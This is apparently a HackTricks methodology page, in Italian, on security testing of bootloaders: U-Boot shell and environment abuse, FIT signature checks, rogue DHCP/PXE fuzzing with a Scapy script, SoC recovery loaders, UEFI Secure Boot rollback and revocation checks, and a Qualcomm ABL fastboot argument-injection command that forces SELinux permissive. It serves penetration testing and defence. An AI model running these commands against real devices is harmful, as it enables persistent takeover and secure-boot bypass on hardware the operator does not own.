# Test del bootloader

{{#include ../../banners/hacktricks-training.md}}

I seguenti passaggi sono consigliati per modificare le configurazioni di avvio dei dispositivi e testare bootloader come U-Boot e i loader di classe UEFI. Concentrati sull'ottenere l'esecuzione precoce del codice, sulla valutazione delle protezioni di firma e rollback e sull'abuso dei percorsi di ripristino o di avvio di rete.

Correlato: bypass del secure boot MediaTek tramite patching di bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Soluzioni rapide per U-Boot e abuso dell'ambiente

1. Accedere alla shell dell'interprete
   - Durante l'avvio, premi un tasto di interruzione noto (spesso un tasto qualsiasi, 0, spazio o una sequenza "magica" specifica della scheda) prima che venga eseguito `bootcmd` per accedere al prompt di U-Boot.<sup>[[1]](#references)</sup>

2. Esaminare lo stato di avvio e le variabili
   - Comandi utili:
     - `printenv` (mostra l'ambiente)
     - `bdinfo` (informazioni sulla scheda, indirizzi di memoria)
     - `help bootm; help booti; help bootz` (metodi di avvio del kernel supportati)
     - `help ext4load; help fatload; help tftpboot` (loader disponibili)

3. Modificare gli argomenti di avvio per ottenere una shell root
   - Aggiungi `init=/bin/sh` in modo che il kernel apra una shell invece di avviare init normalmente:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot dal tuo server TFTP
   - Configura la rete e recupera un'immagine kernel/fit dalla LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Rendere persistenti le modifiche tramite l’ambiente
   - Se lo storage env non è protetto da scrittura, puoi mantenere il controllo:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Verifica la presenza di variabili come `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` che influenzano i percorsi di fallback. Valori configurati in modo errato possono consentire di accedere ripetutamente alla shell.

6. Verifica le funzionalità di debug/non sicure
   - Cerca: `bootdelay` > 0, `autoboot` disabilitato, `usb start; fatload usb 0:1 ...` senza restrizioni, la possibilità di usare `loady`/`loads` tramite seriale, `env import` da supporti non attendibili e kernel/ramdisk caricati senza verifiche della firma.

7. Test delle immagini U-Boot/verifica
   - Se la piattaforma dichiara di usare secure/verified boot con immagini FIT, prova sia immagini non firmate sia immagini manomesse:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - L’assenza di `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` o il comportamento legacy `verify=n` spesso consente di avviare payload arbitrari.
   - Non fermarti a un semplice risultato di allow/deny: ricerche recenti su FIT hanno mostrato che il percorso di verifica stesso può costituire una superficie di attacco pre-auth. Esegui test negativi sui dati FIT archiviati esternamente (`data-offset`, `data-position`, `data-size`), sulla selezione della configurazione firmata, su `loadables` e sulla gestione di overlay / `extra-conf`.
   - Se disponi di un albero dei sorgenti corrispondente, `test/vboot/vboot_test.sh` è un modo rapido per riprodurre il comportamento di verifica FIT nella sandbox di U-Boot prima di intervenire sull’hardware reale.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e flussi di avvio tramite script
   - Nelle build moderne di U-Boot, `bootcmd` è spesso solo un wrapper per Standard Boot. Ciò significa che i supporti scrivibili, PXE o la memoria flash SPI possono diventare il vero confine di fiducia, anche quando l’ambiente visibile sembra innocuo.
   - Il bootmeth `extlinux` cerca `extlinux/extlinux.conf` sotto `/` e `/boot`; il bootmeth per gli script cerca prima `boot.scr.uimg` e poi `boot.scr`. Nell’avvio di rete, il nome dello script può provenire da `boot_script_dhcp`.
   - Comandi utili per il triage:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casi di abuso da testare: supporti USB/SD controllati dall’attaccante posizionati prima in `boot_targets`, `/boot/extlinux/extlinux.conf` scrivibile, server TFTP rogue che fornisce `boot.scr` oppure esecuzione di script tramite SPI con `script_offset_f`.
   - Se la piattaforma si affida alla verifica FIT, assicurati che le configurazioni siano firmate a livello di configurazione e non solo per immagine; `required-mode=all` è più rigoroso che accettare una qualsiasi singola chiave obbligatoria.

## Superficie di network boot (DHCP/PXE) e server rogue

9. Fuzzing dei parametri PXE/DHCP
   - La gestione legacy BOOTP/DHCP di U-Boot ha presentato problemi di memory safety. Per esempio, CVE‑2024‑42040 descrive una divulgazione di memoria tramite risposte DHCP appositamente create, che possono inviare via rete byte della memoria di U-Boot.<sup>[[4]](#references)</sup> Sottoponi a test i percorsi del codice DHCP/PXE con valori troppo lunghi o limite (opzione 67 bootfile-name, opzioni vendor, campi file/servername) e verifica la presenza di blocchi o leak.
   - Snippet Scapy minimo per stressare i parametri di boot durante il netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Verifica inoltre se i campi filename PXE vengono passati alla logica della shell/del loader senza sanitizzazione quando sono concatenati agli script di provisioning lato OS.

10. Test di command injection su server DHCP rogue
   - Configura un servizio DHCP/PXE rogue e prova a inserire caratteri nei campi filename o options per raggiungere gli interpreti di comandi nelle fasi successive della catena di boot. Metasploit’s DHCP auxiliary, `dnsmasq` o script Scapy personalizzati sono adatti allo scopo. Prima, assicurati di isolare la rete di laboratorio.

## Modalità di recovery della ROM del SoC che sovrascrivono il boot normale

Molti SoC espongono una modalità "loader" BootROM che accetta codice tramite USB/UART anche quando le immagini flash non sono valide. Se i fuse secure-boot non sono stati bruciati, questa modalità può consentire l'esecuzione di codice arbitrario molto presto nella catena.

- NXP i.MX (Serial Download Mode)
  - Strumenti: `uuu` (mfgtools3) o `imx-usb-loader`.
  - Esempio: `imx-usb-loader u-boot.imx` per caricare ed eseguire un U-Boot personalizzato dalla RAM.
- Allwinner (FEL)
  - Strumento: `sunxi-fel`.
  - Esempio: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oppure `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Strumento: `rkdeveloptool`.
  - Esempio: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` per predisporre un loader e caricare un U-Boot personalizzato.

Verifica se gli eFuse/OTP del secure-boot del dispositivo sono stati bruciati. In caso contrario, le modalità di download BootROM spesso aggirano qualsiasi verifica di livello superiore (U-Boot, kernel, rootfs) eseguendo direttamente il tuo payload di primo stadio dalla SRAM/DRAM.

## Bootloader UEFI/PC: controlli rapidi

11. Test di manomissione dell'ESP, rollback e registrazione delle chiavi
   - Monta la EFI System Partition (ESP) e cerca i componenti del loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, percorsi dei loghi del vendor.
   - Quando possibile, esegui il dump dello stato di Secure Boot e dei database delle chiavi dal sistema operativo:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Se la piattaforma è in Setup Mode, accetta l’enrollment di chiavi senza autenticazione o viene fornita con una Platform Key di test/predefinita (classe PKfail), un amministratore locale o un attaccante con accesso fisico può enrollare una propria KEK/db e mantenere Secure Boot apparentemente “abilitato” mentre avvia EFI binaries arbitrari.<sup>[[3]](#references)</sup>
   - Prova ad avviare componenti di boot firmati con versioni precedenti o noti per essere vulnerabili, se le revoche di Secure Boot (dbx) non sono aggiornate. Se la piattaforma si fida ancora di vecchi shim/bootmanager, spesso puoi caricare il tuo kernel o `grub.cfg` dalla ESP per ottenere persistenza.
   - Su Windows, gli host aggiornati possono ancora accettare boot manager firmati vulnerabili se il signer `Microsoft Windows Production PCA 2011` è ancora assente dal firmware `dbx`, come osservato con BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Un bypass di tipo Baton Drop può enrollare un MOK dell’attaccante; in seguito uno shim legittimo può caricare un payload EFI firmato con quella chiave.<sup>[[12]](#references)[[13]](#references)</sup> Revocare in seguito il vecchio signer di Windows non rimuove l’MOK enrollato, quindi il percorso basato su shim può persistere se quello shim rimane attendibile.<sup>[[12]](#references)</sup>
   - Prima di testare questo percorso di rollback su una macchina UEFI autorizzata, controlla lo **stato effettivo delle revoche del firmware**, non solo la cronologia degli aggiornamenti di Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft fornisce questo controllo in PowerShell con privilegi elevati e di sola lettura per il signer del 2011 in `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` è solo un indizio: conferma il componente di boot firmato specifico e verifica le altre revoche in un lab ripristinabile.<sup>[[12]](#references)[[14]](#references)</sup> Un aggiornamento del registro in sospeso o un certificato di firma scaduto non equivalgono a una revoca `dbx` completata.<sup>[[13]](#references)[[14]](#references)</sup>

12. Test di revoca di shim / SBAT / dbx obsoleti
   - Gli shim firmati da Microsoft e i fork dei vendor meno recenti possono ancora costituire un vettore di bootkit in stile BYOVD se le revoche sono obsolete. In un lab isolato, inserisci uno shim storicamente vulnerabile nell'ESP e prova a eseguire il chainload del tuo `grubx64.efi` o kernel.<sup>[[11]](#references)</sup>
   - Triage rapido:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Se lo shim continua a essere eseguito nonostante sia presente nell'elenco di revoca, il firmware/OS ha aggiornamenti `dbx` obsoleti oppure si fida di un loader forked che non ha mai ereditato le protezioni SBAT upstream.

13. Bug di parsing del logo di avvio (classe LogoFAIL)
   - Diversi firmware OEM/IBV erano vulnerabili a flaw di parsing delle immagini in DXE durante l'elaborazione dei loghi di avvio. Se un attaccante riesce a collocare un'immagine appositamente creata nell'ESP in un percorso specifico del vendor (ad es., `\EFI\<vendor>\logo\*.bmp`) e a riavviare, potrebbe essere possibile ottenere l'esecuzione di codice durante le prime fasi dell'avvio anche con Secure Boot abilitato. Verifica se la piattaforma accetta loghi forniti dall'utente e se tali percorsi sono scrivibili dal sistema operativo.<sup>[[2]](#references)</sup>


## Lacune di fiducia in Android/Qualcomm ABL + GBL (Android 16)

Sui dispositivi Android 16 che usano ABL di Qualcomm per caricare la **Generic Bootloader Library (GBL)**, verifica se ABL **autentica** l'app UEFI che carica dalla partizione `efisp`. Se ABL controlla solo la **presenza** dell'app UEFI senza verificarne le firme, una primitiva di scrittura su `efisp` consente l'**esecuzione di codice non firmato prima del sistema operativo** all'avvio.<sup>[[6]](#references)[[7]](#references)</sup>

Verifiche pratiche e possibili vettori di abuso:

- **primitiva di scrittura su efisp**: Serve un modo per scrivere un'app UEFI personalizzata in `efisp` (servizio root/privilegiato, bug in un'app OEM, percorso recovery/fastboot). Senza questo, la lacuna nel caricamento di GBL non è direttamente sfruttabile.<sup>[[6]](#references)</sup>
- **iniezione di argomenti OEM fastboot** (bug di ABL): Alcune build accettano token aggiuntivi in `fastboot oem set-gpu-preemption` e li aggiungono alla riga di comando del kernel. Questo può essere usato per forzare SELinux in modalità permissiva, consentendo la scrittura su partizioni protette:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Se il dispositivo è stato corretto, il comando dovrebbe rifiutare gli argomenti aggiuntivi.<sup>[[5]](#references)[[6]](#references)</sup>
- **Sblocco del bootloader tramite flag persistenti**: un payload in fase di avvio può modificare i flag persistenti di sblocco (ad es., `is_unlocked=1`, `is_unlocked_critical=1`) per simulare `fastboot oem unlock` senza passare dai controlli del server/dell’approvazione OEM. La modifica rimane attiva dopo il riavvio successivo.<sup>[[6]](#references)</sup>

Note difensive/di triage:

- Verifica se ABL esegue la verifica della firma sul payload GBL/UEFI proveniente da `efisp`. In caso contrario, considera `efisp` una superficie di persistenza ad alto rischio.
- Verifica se i gestori fastboot OEM di ABL sono stati modificati per **convalidare il numero di argomenti** e rifiutare token aggiuntivi.<sup>[[8]](#references)[[9]](#references)</sup>

## Avvertenze hardware

Presta attenzione quando interagisci con la memoria flash SPI/NAND durante l’avvio iniziale (ad es., mettendo a massa i pin per aggirare le letture) e consulta sempre il datasheet della memoria flash. Cortocircuiti eseguiti nel momento sbagliato possono danneggiare il dispositivo o il programmatore.

## Note e suggerimenti aggiuntivi

- Prova `env export -t ${loadaddr}` e `env import -t ${loadaddr}` per spostare i blob dell’ambiente tra RAM e memoria; alcune piattaforme consentono di importare l’ambiente da supporti rimovibili senza autenticazione.
- Per ottenere persistenza sui sistemi basati su Linux che si avviano tramite `extlinux.conf`, spesso è sufficiente modificare la riga `APPEND` (per inserire `init=/bin/sh` o `rd.break`) nella partizione di avvio, se non vengono applicati controlli della firma.
- Se il target usa aggiornamenti a doppio slot / A/B, consulta le tecniche anti-rollback e di desincronizzazione degli slot nella [panoramica sull’analisi del firmware](README.md), per non trascurare le lacune di fiducia presenti solo nell’updater e non nel bootloader stesso.
- Se lo spazio utente fornisce `fw_printenv/fw_setenv`, verifica che `/etc/fw_env.config` corrisponda alla memoria effettiva dell’ambiente. Offset configurati in modo errato consentono di leggere/scrivere la regione MTD sbagliata.

## References

- [1] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Alla scoperta di LogoFAIL: i pericoli dell’analisi delle immagini durante l’avvio del sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: le chiavi di piattaforma non attendibili compromettono Secure Boot nell’ecosistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Dettagli su CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: sbloccare Xiaomi tramite due stringhe non sanificate](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [L’exploit GBL di Qualcomm Snapdragon 8 Elite consente agli attaccanti di sbloccare i bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architettura del Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: correzione della propagazione di input non attendibili nella riga di comando del kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: aggiunta di un controllo per il comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: violare la verifica della firma FIT di U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota sulla vulnerabilità VU#616257 - I bootloader shim UEFI firmati da Microsoft sono vulnerabili al bypass di Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus: il mito confermato](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: un bootkit UEFI simile a BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Come gestire le revoche di Windows Boot Manager per le modifiche a Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
